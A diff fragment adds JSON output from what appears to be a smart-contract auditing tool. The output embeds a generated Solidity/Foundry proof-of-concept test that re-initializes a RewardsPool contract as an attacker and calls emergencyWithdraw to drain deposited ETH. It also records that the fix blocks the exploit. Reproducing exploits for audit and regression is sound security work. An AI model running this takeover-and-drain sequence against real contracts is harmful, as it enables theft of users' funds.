+          "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-1: template initializer-takeover@1, slots filled by heuristics.\n// Hypothesis: RewardsPool.initialize(address,uint256) can be called again after deployment and hands its caller privileged roles.\n// Property under test: Only the deployer-chosen owner may control the contract after initialization.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {RewardsPool as PramaanTarget} from \"src/RewardsPool.sol\";\n\ncontract PramaanExploit_PRM_1 is Test {\n    PramaanTarget internal target;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        vm.startPrank(owner);\n        target = new PramaanTarget();\n        target.initialize(owner, 0);\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.fund{value: SEED}();\n    }\n\n    function test_exploit() public {\n        uint256 attackerBefore = attacker.balance;\n        vm.startPrank(attacker);\n        target.initialize(attacker, 0);\n        target.emergencyWithdraw();\n        vm.stopPrank();\n        emit log_named_uint(\"pramaan.attacker_gain\", attacker.balance - attackerBefore);\n        assertGe(attacker.balance - attackerBefore, SEED, \"Pramaan: re-initialising let an outsider take deposited ETH\");\n    }\n}\n",
+          "sha256": "7f53d60779e8d57ca7f4ee1a7e2cefffdadca3fe494614ad360b3b719136eeb7"
+        },
+        "detail": "exploit blocked (reverted: already initialized); 2 regression tests pass",
+        "durationMs": 7001
+      }
+    }
+  }
+}
